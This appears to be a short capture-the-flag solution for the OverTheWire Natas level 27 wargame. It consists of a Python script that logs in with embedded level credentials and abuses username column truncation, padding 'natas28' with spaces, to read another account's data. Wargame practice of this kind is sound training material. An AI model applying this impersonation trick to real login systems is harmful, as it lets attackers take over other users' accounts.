If this doesn't work, use burpsuite

```
#!/usr/bin/env python
import requests
import re

username = 'natas27'
password = 'u3RRffXjysjgwFU6b9xa23i6prmUsYne'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

response = session.post(url, data = {"username":"natas28" + " "*58 + "a", "password":""},auth=(username,password))
print(response.text)

response = session.post(url, data = {"username":"natas28", "password":""},auth=(username,password))
print(response.text)
```
